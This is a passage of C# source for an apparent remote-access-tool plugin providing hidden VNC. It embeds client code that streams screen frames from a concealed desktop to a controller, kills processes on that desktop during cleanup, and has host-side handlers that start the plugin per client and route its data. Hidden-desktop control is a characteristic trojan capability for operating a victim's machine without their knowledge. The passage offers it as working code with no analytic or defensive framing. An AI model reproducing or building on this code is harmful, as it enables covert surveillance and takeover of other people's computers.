                                frame[1] = (byte)(bmp.Width & 0xFF); frame[2] = (byte)((bmp.Width >> 8) & 0xFF);
                                frame[3] = (byte)(bmp.Height & 0xFF); frame[4] = (byte)((bmp.Height >> 8) & 0xFF);
                                frame[5] = (byte)(data.Length & 0xFF); frame[6] = (byte)((data.Length >> 8) & 0xFF);
                                frame[7] = (byte)((data.Length >> 16) & 0xFF); frame[8] = (byte)((data.Length >> 24) & 0xFF);
                                Buffer.BlockCopy(data, 0, frame, 9, data.Length);
                                var sendTask = _send(frame);
                                if (await Task.WhenAny(sendTask, Task.Delay(5000)) != sendTask)
                                    LogS(""[HVNC] Frame send timeout"");
                                else
                                    await sendTask;
                            }
                        }
                        catch (Exception ex) { LogS(""[HVNC] Cap err: "" + ex.Message); }
                        finally { _sending = 0; }
                        sw.Stop();
                        int delay = 33 - (int)sw.ElapsedMilliseconds;
                        if (delay > 5) await Task.Delay(delay);
                    }
                }
            catch { }
        }

        void Cleanup()
        {
            try
            {
                if (_hDesk != IntPtr.Zero)
                {
                    try
                    {
                        var pids = new System.Collections.Generic.HashSet<uint>();
                        EnumDesktopWindows(_hDesk, (hw, lp) => { uint pid; GetWindowThreadProcessId(hw, out pid); if (pid != 0) pids.Add(pid); return true; }, IntPtr.Zero);
                        foreach (uint pid in pids) { try { var p = Process.GetProcessById((int)pid); if (p != null && !p.HasExited) p.Kill(); } catch {} }
                    }
                    catch {}
                    Thread.Sleep(500);
                    CloseDesktop(_hDesk); _hDesk = IntPtr.Zero;
                }
            }
            catch {}
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            if (!_host.IsPluginActive(context.ClientId, PluginId))
                _ = Task.Run(async () => { try { await _host.StartPluginForClient(context.ClientId, PluginId); } catch { } });
            var ui = new HvncUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data != null && data.Length > 0 && _clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }
    }
}
